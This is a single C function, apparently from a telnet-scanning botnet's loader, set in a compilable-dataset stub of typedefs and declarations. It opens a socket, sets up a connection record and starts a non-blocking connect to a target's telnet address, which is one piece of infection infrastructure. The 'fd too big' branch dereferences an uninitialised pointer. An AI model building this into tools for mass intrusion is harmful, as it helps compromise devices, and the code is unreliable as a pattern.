#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_4__   TYPE_2__ ;
typedef  struct TYPE_3__   TYPE_1__ ;

/* Type definitions */
struct telnet_info {int /*<<< orphan*/  port; int /*<<< orphan*/  addr; } ;
struct TYPE_3__ {int /*<<< orphan*/  s_addr; } ;
struct sockaddr_in {int /*<<< orphan*/  sin_port; TYPE_1__ sin_addr; int /*<<< orphan*/  sin_family; } ;
struct sockaddr {int dummy; } ;
struct server_worker {int /*<<< orphan*/  efd; } ;
struct server {size_t workers_len; int max_open; struct connection** estab_conns; int /*<<< orphan*/  curr_open; int /*<<< orphan*/  curr_worker_child; struct server_worker* workers; } ;
struct TYPE_4__ {int fd; } ;
struct epoll_event {int /*<<< orphan*/  events; TYPE_2__ data; } ;
struct connection {int fd; struct server* srv; int /*<<< orphan*/  info; } ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 int /*<<< orphan*/  ATOMIC_DEC (int /*<<< orphan*/ *) ; 
 size_t ATOMIC_INC (int /*<<< orphan*/ *) ; 
 scalar_t__ EINPROGRESS ; 
 int /*<<< orphan*/  EPOLLOUT ; 
 int /*<<< orphan*/  EPOLL_CTL_ADD ; 
 int connect (int,struct sockaddr*,int) ; 
 int /*<<< orphan*/  connection_close (struct connection*) ; 
 int /*<<< orphan*/  connection_open (struct connection*) ; 
 int /*<<< orphan*/  epoll_ctl (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int,struct epoll_event*) ; 
 scalar_t__ errno ; 
 int /*<<< orphan*/  memcpy (int /*<<< orphan*/ *,struct telnet_info*,int) ; 
 int /*<<< orphan*/  printf (char*) ; 
 int time (int /*<<< orphan*/ *) ; 
 int util_socket_and_bind (struct server*) ; 

void server_telnet_probe(struct server *srv, struct telnet_info *info)
{
    int fd = util_socket_and_bind(srv);
    struct sockaddr_in addr;
    struct connection *conn;
    struct epoll_event event;
    int ret;
    struct server_worker *wrker = &srv->workers[ATOMIC_INC(&srv->curr_worker_child) % srv->workers_len];

    if (fd == -1)
    {
        if (time(NULL) % 10 == 0)
        {
            printf("Failed to open and bind socket\n");
        }
        ATOMIC_DEC(&srv->curr_open);
        return;
    }
    while (fd >= (srv->max_open * 2))
    {
        printf("fd too big\n");
        conn->fd = fd;
#ifdef DEBUG
        printf("Can't utilize socket because client buf is not large enough\n");
#endif
        connection_close(conn);
        return;
    }

    if (srv == NULL)
        printf("srv == NULL 4\n");

    conn = srv->estab_conns[fd];
    memcpy(&conn->info, info, sizeof (struct telnet_info));
    conn->srv = srv;
    conn->fd = fd;
    connection_open(conn);

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = info->addr;
    addr.sin_port = info->port;
    ret = connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));
    if (ret == -1 && errno != EINPROGRESS)
    {
        printf("got connect error\n");
    }

    event.data.fd = fd;
    event.events = EPOLLOUT;
    epoll_ctl(wrker->efd, EPOLL_CTL_ADD, fd, &event);
}